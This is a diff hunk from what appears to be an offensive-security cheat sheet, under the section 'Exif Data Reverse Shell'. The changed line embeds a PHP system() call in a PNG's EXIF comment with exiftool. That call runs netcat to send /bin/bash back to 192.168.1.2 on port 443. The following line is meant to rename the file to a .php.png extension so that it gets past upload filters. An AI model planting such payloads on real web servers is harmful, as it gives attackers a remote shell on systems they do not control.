@@ -213,7 +213,7 @@
   # <kbd>Exif Data Reverse Shell</kbd>
    
   ```cmd
-  root@kali:~# exiftool -Comment='<?php system(“nc <YourIP> <YourPort> -e /bin/bash”); ?>' filename.png
+  root@kali:~# exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png
   root@kali:~# filename.png filename.php.png
   ```
    
